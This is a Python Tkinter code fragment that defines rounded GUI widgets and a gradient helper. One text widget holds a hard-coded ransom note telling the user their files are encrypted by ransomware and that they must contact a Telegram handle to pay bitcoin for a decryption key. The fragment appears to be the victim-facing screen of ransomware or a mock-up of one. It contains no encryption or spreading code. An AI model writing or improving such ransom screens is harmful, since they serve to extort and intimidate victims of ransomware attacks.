def draw_gradient(canvas, width, height, start_color, end_color):
    image = Image.new("RGB", (width, height))
    draw = ImageDraw.Draw(image)
    for i in range(height):
        r = int(start_color[0] * (1 - i / height) + end_color[0] * (i / height))
        g = int(start_color[1] * (1 - i / height) + end_color[1] * (i / height))
        b = int(start_color[2] * (1 - i / height) + end_color[2] * (i / height))
        draw.line([(0, i), (width, i)], fill=(r, g, b))
    photo = ImageTk.PhotoImage(image)
    canvas.create_image(0, 0, anchor='nw', image=photo)
    canvas.image = photo

class RoundedWidget(tk.Frame):
    def __init__(self, parent, bg, width, height, corner_radius, **kwargs):
        super().__init__(parent, bg=bg, **kwargs)
        self.corner_radius = corner_radius
        self.bg_color = bg
        self.canvas = tk.Canvas(self, bg=bg, bd=0, highlightthickness=0, width=width, height=height)
        self.canvas.pack(fill=tk.BOTH, expand=True)
        self.draw_rounded_rectangle(width, height, corner_radius)

    def draw_rounded_rectangle(self, width, height, radius):
        self.canvas.create_oval(0, 0, radius*2, radius*2, fill=self.bg_color, outline=self.bg_color)  # Top-left
        self.canvas.create_oval(width-radius*2, 0, width, radius*2, fill=self.bg_color, outline=self.bg_color)  # Top-right
        self.canvas.create_oval(0, height-radius*2, radius*2, height, fill=self.bg_color, outline=self.bg_color)  # Bottom-left
        self.canvas.create_oval(width-radius*2, height-radius*2, width, height, fill=self.bg_color, outline=self.bg_color)  # Bottom-right
        self.canvas.create_rectangle(radius, 0, width-radius, height, fill=self.bg_color, outline=self.bg_color)  # Top-center
        self.canvas.create_rectangle(0, radius, width, height-radius, fill=self.bg_color, outline=self.bg_color)  # Center

class RoundedText(RoundedWidget):
    def __init__(self, parent, **kwargs):
        super().__init__(parent, bg='black', width=400, height=250, corner_radius=15, **kwargs)
        self.text = tk.Text(self, bd=0, highlightthickness=0, wrap=tk.WORD, bg='black', fg='green', height=14, width=50)
        self.text.place(relwidth=1, relheight=1)
        msg =  f"""

we are <hacker group>

we have infected this device with ransomware
your important files have been encrypted
you will need to buy a key to decrypt your files

contact @<username> in the telegram app
to negotiate a bitcoin payment for the key"""
        self.text.insert(tk.END, msg)
        self.text.tag_configure("center", justify='center')
        self.text.tag_add("center", "1.0", "end")

class RoundedEntry(RoundedWidget):
    def __init__(self, parent, **kwargs):
        super().__init__(parent, bg='black', width=300, height=30, corner_radius=15, **kwargs)
        self.entry = tk.Entry(self, bd=0, highlightthickness=0, bg='black', fg='white', width=35)
        self.entry.place(relwidth=1, relheight=1)

class RoundedButton(tk.Frame):
    def __init__(self, parent, text, command, **kwargs):
        super().__init__(parent, **kwargs)
        self.canvas = tk.Canvas(self, bg='black', bd=0, highlightthickness=0, width=150, height=30)
        self.canvas.pack(fill=tk.BOTH, expand=True)
        self.draw_rounded_rectangle(150, 30, 15)
        self.button = tk.Button(self, text=text, command=command, bd=0, highlightthickness=0, bg='black', fg='green')
        self.button.place(relwidth=1, relheight=1)

    def draw_rounded_rectangle(self, width, height, radius):
        self.canvas.create_oval(0, 0, radius*2, radius*2, fill='black', outline='black')  # Top-left
        self.canvas.create_oval(width-radius*2, 0, width, radius*2, fill='black', outline='black')  # Top-right
        self.canvas.create_oval(0, height-radius*2, radius*2, height, fill='black', outline='black')  # Bottom-left
        self.canvas.create_oval(width-radius*2, height-radius*2, width, height, fill='black', outline='black')  # Bottom-right
        self.canvas.create_rectangle(radius, 0, width-radius, height, fill='black', outline='black')  # Top-center
        self.canvas.create_rectangle(0, radius, width, height-radius, fill='black', outline='black')  # Center


